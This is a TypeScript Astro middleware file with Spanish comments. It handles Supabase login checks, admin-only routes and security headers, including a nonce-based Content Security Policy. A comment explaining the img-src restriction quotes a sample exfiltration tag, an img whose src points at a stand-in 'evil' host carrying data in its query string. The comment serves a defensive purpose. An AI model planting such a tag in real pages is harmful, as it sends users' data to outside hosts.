import { defineMiddleware } from 'astro:middleware';
import { AUTH_CONFIGURADA, crearClienteUsuario, tieneCookieSesion, urlEntrar } from '@lib/auth/servidor';
import { ORIGENES_IMAGEN } from '@lib/cdn';

// Rutas que exigen sesión, y las que además exigen rol de administrador.
const PRIVADAS = ['/cuenta'];
const SOLO_ADMIN = ['/dashboard', '/api/moderacion'];

function cuelgaDe(ruta: string, prefijos: string[]): boolean {
  return prefijos.some((p) => ruta === p || ruta.startsWith(`${p}/`));
}

export const onRequest = defineMiddleware(async (context, next) => {
  const ruta = context.url.pathname.replace(/\/+$/, '') || '/';
  const requiereSesion = cuelgaDe(ruta, PRIVADAS) || cuelgaDe(ruta, SOLO_ADMIN);

  // Nonce de la CSP: se genera antes de renderizar para que `Base.astro` lo
  // ponga en sus scripts `is:inline`, y luego se repite en la cabecera.
  context.locals.nonce = crypto.randomUUID().replace(/-/g, '');
  context.locals.usuario = null;
  context.locals.supabase = AUTH_CONFIGURADA ? crearClienteUsuario(context) : null;

  // Visitante sin cookie de sesión: se ahorra la validación contra Supabase.
  if (context.locals.supabase && tieneCookieSesion(context.request)) {
    const { data } = await context.locals.supabase.auth.getUser();
    if (data.user) {
      context.locals.usuario = {
        id: data.user.id,
        email: data.user.email ?? '',
        // Publicar exige correo confirmado. Google llega confirmado de origen.
        emailConfirmado: Boolean(data.user.email_confirmed_at),
        // El rol vive en `app_metadata`, que solo se escribe desde el servidor
        // de Supabase: el usuario no puede modificarlo y viaja en el JWT, así
        // que no cuesta una consulta por request.
        rol: data.user.app_metadata?.rol === 'admin' ? 'admin' : 'usuario',
      };
    }
  }

  if (requiereSesion && !context.locals.usuario) {
    return context.redirect(urlEntrar(context.url.pathname), 302);
  }

  // Sesión sin rol de administrador: la respuesta es un 403 sobre la misma URL
  // en vez de un rebote mudo al home. `/api/moderacion` se invoca desde los
  // formularios nativos del dashboard, donde una página de error no aporta y el
  // redirect sigue siendo el mejor destino.
  const sinPermiso = cuelgaDe(ruta, SOLO_ADMIN) && context.locals.usuario?.rol !== 'admin';
  if (sinPermiso && ruta.startsWith('/api/')) {
    return context.redirect('/', 302);
  }

  // Pasarle la ruta a `next` reescribe sin repetir la pasada de middleware, así
  // que el 403 se renderiza con la sesión ya resuelta y su respuesta sigue
  // recibiendo las cabeceras de seguridad de más abajo.
  const respuesta = await next(sinPermiso ? '/403' : undefined);

  // Astro emite las respuestas SSR como `text/html` a secas. La declaración de
  // codificación queda entonces solo en el <meta charset> del layout y, aunque
  // ahí llega dentro de los primeros 1024 bytes, la cabecera es la que manda:
  // sin el parámetro, los auditores la dan por ausente.
  const tipo = respuesta.headers.get('content-type');
  const esHtml = Boolean(tipo?.startsWith('text/html'));
  if (esHtml && !tipo!.includes('charset')) {
    respuesta.headers.set('content-type', 'text/html; charset=utf-8');
  }

  aplicarCabecerasSeguridad(respuesta, esHtml, context.locals.nonce);

  return respuesta;
});

/**
 * CSP de un documento HTML.
 *
 * `script-src` no lleva `'unsafe-inline'`: los scripts inline del layout van con
 * nonce y el resto los empaqueta Astro como `'self'`, así que un `</script>`
 * inyectado no se ejecutaría.
 *
 * En desarrollo Vite sirve el CSS en un `<style>` inyectado que no se puede
 * noncear, así que ahí —y solo ahí— `style-src` admite inline. En producción las
 * hojas van todas como archivo (`inlineStylesheets: 'never'`), de modo que un
 * `<style>` inyectado —exfiltración por CSS, desfiguración— no se aplica.
 */
export function cspDocumento(nonce: string, dev = false): string {
  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}'`,
    dev ? "style-src 'self' 'unsafe-inline'" : "style-src 'self'",
    // Los `style=` con valores calculados de /dashboard, /mercado y /marcas no
    // admiten nonce por especificación, así que el atributo queda abierto aunque
    // la hoja no lo esté.
    "style-src-attr 'unsafe-inline'",
    // Solo los orígenes desde los que el sitio sirve fotos; `data:` para los SVG
    // inline. Un `https:` abierto es un canal de exfiltración clásico
    // (`<img src="https://evil/?d=...">`).
    ["img-src 'self' data:", ...ORIGENES_IMAGEN].join(' '),
    "connect-src 'self'",
    "font-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'",
  ].join('; ');
}

/**
 * CSP de lo que no es un documento (sitemap, endpoints): no carga nada ni se
 * enmarca. Sin esto eran la única familia de respuestas del sitio sin política.
 */
export const CSP_NO_DOCUMENTO = "default-src 'none'; frame-ancestors 'none'; base-uri 'none'";

// Cabeceras de seguridad para todo el sitio.
function aplicarCabecerasSeguridad(respuesta: Response, esHtml: boolean, nonce: string): void {
  const h = respuesta.headers;
  h.set('X-Content-Type-Options', 'nosniff');
  h.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  h.set('X-Frame-Options', 'DENY');
  if (import.meta.env.PROD) {
    h.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
  }

  h.set(
    'Content-Security-Policy',
    esHtml ? cspDocumento(nonce, import.meta.env.DEV) : CSP_NO_DOCUMENTO,
  );
}
